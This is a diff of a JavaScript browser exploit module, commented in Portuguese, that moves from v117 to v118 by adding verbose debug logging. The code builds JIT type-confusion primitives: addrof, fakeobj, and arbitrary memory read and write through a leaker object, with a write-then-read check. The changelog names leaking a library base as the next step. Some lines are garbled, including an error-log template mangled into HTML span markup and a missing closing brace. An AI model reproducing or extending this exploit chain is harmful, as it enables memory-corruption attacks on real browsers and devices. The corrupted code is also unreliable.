@@ -1,19 +1,17 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v117 - Estratégia JIT Confusion)
+// js/script3/testArrayBufferVictimCrash.mjs (v118 - Validação com Logs Verbosos)
 // =======================================================================================
 // LOG DE ALTERAÇÕES:
-// - ABANDONADA: A estratégia "Heisenbug" (OOB Write) foi completamente removida por ser ineficaz.
-// - ADOTADA: Implementada a técnica de vulnerabilidade de JIT Type Confusion do script v100,
-//   que se mostrou 100% funcional.
-// - PRIMITIVAS: recriadas as primitivas addrof/fakeobj e arb_read/arb_write usando a
-//   nova técnica baseada em dois arrays (confused_array e victim_array).
-// - VERIFICAÇÃO: Incluído um teste funcional que escreve e lê um valor para confirmar
-//   a confiabilidade das novas primitivas de L/E arbitrária.
+// - ADICIONADO: Logs de depuração verbosos em todas as fases do exploit para fornecer
+//   uma visão detalhada do fluxo de execução.
+// - FOCO: Validar o comportamento interno das primitivas addrof, fakeobj, arb_read e
+//   arb_write antes de prosseguir para o vazamento da base da biblioteca.
+// - A lógica funcional do exploit v117 permanece inalterada.
 // =======================================================================================
 
 import { logS3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex } from '../utils.mjs';
 
-export const FNAME_MODULE_FINAL = "Uncaged_v117_JIT_Confusion";
+export const FNAME_MODULE_FINAL = "Uncaged_v118_Verbose_Validation";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -37,7 +35,7 @@ function doubleToInt64(double) {
 // =======================================================================================
 export async function runFinalUnifiedTest() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_FINAL;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Estratégia de JIT Type Confusion ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Validação com Logs Verbosos ---`, "test");
 
     let final_result = { success: false, message: "A cadeia de exploração falhou." };
 
@@ -45,9 +43,6 @@ export async function runFinalUnifiedTest() {
         // --- FASE 1: Estabelecer Primitivas 'addrof' e 'fakeobj' via JIT-Confusion ---
         logS3("--- FASE 1: Configurando primitivas via JIT Type Confusion... ---", "subtest");
 
-        // #REASONING: Estes dois arrays são a chave da vulnerabilidade. O JIT
-        // provavelmente otimizará o código de forma a fazer com que seus buffers de
-        // dados se sobreponham na memória (aliasing).
         const confused_array = [13.37];
         const victim_array = [{ a: 1 }];
 
@@ -65,21 +60,36 @@ export async function runFinalUnifiedTest() {
         logS3("--- FASE 2: Construindo L/E arbitrária... ---", "subtest");
         const leaker_obj = { obj_prop: null, val_prop: 0 };
         const leaker_addr = addrof(leaker_obj);
-        // O offset 0x10 aponta para a primeira propriedade inline do objeto (obj_prop).
+        // #VERBOSE
+        logS3(`  [VERBOSE] Endereço do leaker_obj (via addrof): ${toHex(leaker_addr)}`, "debug");
+
         const leaker_obj_prop_addr = new AdvancedInt64(leaker_addr.low() + 0x10, leaker_addr.high());
+        // #VERBOSE
+        logS3(`  [VERBOSE] Endereço calculado da propriedade 'obj_prop': ${toHex(leaker_obj_prop_addr)}`, "debug");
 
         const arb_read = (addr) => {
-            // Cria um objeto falso que aponta para o endereço desejado
+            // #VERBOSE
+            logS3(`  [arb_read] Lendo de: ${toHex(addr)}`, 'debug');
             const fake = fakeobj(addr);
-            // Faz com que leaker_obj.obj_prop aponte para nosso objeto falso
+            // #VERBOSE
+            logS3(`  [arb_read] Objeto falso criado apontando para o endereço.`, 'debug');
             leaker_obj.obj_prop = fake;
-            // Lê leaker_obj.val_prop, que na verdade lerá do endereço apontado por obj_prop
-            return doubleToInt64(leaker_obj.val_prop);
+            const val_as_double = leaker_obj.val_prop;
+            // #VERBOSE
+            logS3(`  [arb_read] Valor lido como double: ${val_as_double}`, 'debug');
+            return doubleToInt64(val_as_double);
         };
+        
         const arb_write = (addr, value) => {
+            // #VERBOSE
+            logS3(`  [arb_write] Escrevendo em: ${toHex(addr)}`, 'debug');
             const fake = fakeobj(addr);
+            // #VERBOSE
+            logS3(`  [arb_write] Objeto falso criado apontando para o endereço.`, 'debug');
             leaker_obj.obj_prop = fake;
             leaker_obj.val_prop = int64ToDouble(value);
+            // #VERBOSE
+            logS3(`  [arb_write] Valor ${toHex(value)} escrito.`, 'debug');
         };
         logS3("Primitivas de L/E arbitrária construídas.", "good");
 
@@ -88,9 +98,9 @@ export async function runFinalUnifiedTest() {
         const test_obj = { prop_a: 0xDEADBEEF, prop_b: 0xCAFEBABE };
         const test_obj_addr = addrof(test_obj);
         const prop_a_addr = new AdvancedInt64(test_obj_addr.low() + 0x10, test_obj_addr.high());
-
-        const value_to_write = new AdvancedInt64(0x11223344, 0x55667788);
         logS3(`Endereço alvo da propriedade 'a': ${toHex(prop_a_addr)}`, "info");
+        
+        const value_to_write = new AdvancedInt64(0x11223344, 0x55667788);
         logS3(`Escrevendo o valor de teste: ${toHex(value_to_write)}`, "info");
         arb_write(prop_a_addr, value_to_write);
 
@@ -109,10 +119,9 @@ export async function runFinalUnifiedTest() {
 
     } catch (e) {
         final_result.message = `Exceção crítica na implementação: ${e.message}`;
-        logS3(`${final_result.message}\n${e.stack || ''}`, "critical");
+        logS3(`<span class="math-inline">\{final\_result\.message\}\\n</span>{e.stack || ''}`, "critical");
         console.error(e);
     }
 
     logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
-    return final_result;
-}
+    return final_result
